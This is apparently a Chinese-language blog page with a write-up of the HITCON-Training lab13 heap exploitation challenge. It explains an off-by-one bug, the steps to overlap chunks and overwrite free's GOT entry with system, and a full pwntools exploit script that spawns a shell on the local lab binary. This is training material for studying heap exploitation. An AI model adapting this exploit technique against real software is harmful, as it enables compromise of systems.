@@ -1,0 +1,227 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hitcon-Training-lab13 - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="首先检查下保护之后放入ida查看：可以看到这是一道典型的菜单题：第一个功能creat：我们可以通过下面两处来大致猜测一下heaparray[]的结构。    
+struct heap{
+    si,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">Hitcon-Training-lab13</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">Hitcon-Training-lab13</h1>
+        <div class="stuff">
+            <span>十月 12, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>首先检查下保护<br><img src="https://i.loli.net/2019/10/03/e6UDWZNun7m2iCI.jpg" alt="59BCA7CC3D064EEB8C7281E8DEC0277C.jpg"><br>之后放入ida查看：<br>可以看到这是一道典型的菜单题：<br><img src="https://i.loli.net/2019/10/03/wOzDxFBPydkbTZj.jpg" alt="F56473F72760494D88238E1B82D8E8BD.jpg"><br>第一个功能creat：<br><img src="https://i.loli.net/2019/10/03/hlonPzArKbZORB2.jpg" alt="2922A3234ACD4555BEA01DAA45E4C1A2.jpg"><br>我们可以通过下面两处来大致猜测一下heaparray[]的结构。<br><img src="https://i.loli.net/2019/10/03/Vpa4e1iBZFfrT3N.jpg" alt="4973C2BBC9D241D48D74EDEFA5EE1DDE.jpg"><br><img src="https://i.loli.net/2019/10/03/ora3SuNf4XQvEkL.jpg" alt="156F2BDEAB524FA2921EEDD42A440F56.jpg">    </p>
+<pre><code class="cpp">struct heap{
+    size_t size;
+    char *content
+};
+heaparray[]应该属于heap *
+</code></pre>
+<p>我们接下来看edit功能：<br><img src="https://i.loli.net/2019/10/03/LyiK4Spbe36vz51.jpg" alt="26DC61F5E2E84BB78B05D922E08AD38E.jpg"><br>可以在这里找到一个off-by-one漏洞：<br><img src="https://i.loli.net/2019/10/03/bC1ifFUmtqjuyBW.jpg" alt="F0406E99221A4FEEADF3BA6F45A4A66A.jpg"><br>我们可以利用它来改写下一个chunk的size<br>接下来看看delet功能：<br><img src="https://i.loli.net/2019/10/03/La4t9ZBHPohjEYl.jpg" alt="197FCAEDA61445BA9F3FF410E6BE3FBF.jpg"><br>接下来简单说一下利用的思路：      </p>
+<ul>
+<li>1.首先创建两个堆块：chunk0和chunk1。</li>
+<li>2.利用edit先将/bin/sh写入，在通过里面的off-by-one来将chunk1的size修改。    </li>
+<li>3.malloc一个新的chunk2，使其落在chunk1的位置，之后修改content内容，利用show功能泄露出free的got表地址。   </li>
+<li>4.将free的got表修改为system，delet（chunk0）达到目的     </li>
+</ul>
+<p>这是创建好chunk0和chunk1之后的内存：<br><img src="https://i.loli.net/2019/10/03/HtbZRjnlqwG5TYo.jpg" alt="4AB83C8875F2499EA32CF0A66D762DF2.jpg"><br>(因为之前那次调试出了点小问题，所以接下来的图会和前面有些微的区别)<br>下图为先使chunk2落在chunk1处后，在通过构造使得内存满足heaparray的结构，便于之后通过show来泄露地址。<br><img src="https://i.loli.net/2019/10/03/aoft3VwGXrFbxCE.jpg" alt="E29FFF5D023E414C91D69DDF4CA2F01C.jpg"><br>最后再通过edit功能将free的got表修改为system的got表，再delete（chunk0）即可达到目的。<br><img src="https://i.loli.net/2019/10/03/uabUy4FgAqV5MNk.jpg" alt="4D2E8F6624F6400E90A351681F4DE91D.jpg"><br>最后附上exp脚本：      </p>
+<pre><code class="cpp">from pwn import *
+context(os=&#39;linux&#39; , arch = &#39;amd64&#39; , log_level= &#39;debug&#39;)
+p=process(&#39;./heapcreator&#39;)
+def debug(msg=&#39;&#39;):
+    gdb.attach(p,&#39;&#39;)
+    pause()
+elf=ELF(&#39;./heapcreator&#39;)
+libc=elf.libc
+free_got=elf.got[&#39;free&#39;]
+free_libc=libc.symbols[&#39;free&#39;]
+system_libc=libc.symbols[&#39;system&#39;]
+def create(size,content):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;1&#39;)
+    p.recvuntil(&#39;Size of Heap :&#39;)
+    p.sendline(str(size))
+    p.recvuntil(&#39;Content of heap:&#39;)
+    p.send(content)
+def edit(index,content):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(index))
+    p.recvuntil(&#39;Content of heap : &#39;)
+    p.send(content)
+def show(index):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;3&#39;)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(index))
+def delete(index):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;4&#39;)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(index))
+#debug()
+create(0x18,&#39;a&#39;*8)
+create(0x10,&#39;b&#39;*8)
+edit(0,&#39;/bin/sh\x00&#39;+&#39;a&#39;*0x10+p64(0x41))
+delete(1)
+create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
+show(1)
+p.recvuntil(&#39;Content : &#39;)
+free=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+libc_base=free-free_libc
+system=system_libc+libc_base
+print &#39;system:&#39;+hex(system)
+edit(1,p64(system))
+delete(0)
+p.interactive()    
+</code></pre>
+<p>结束。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
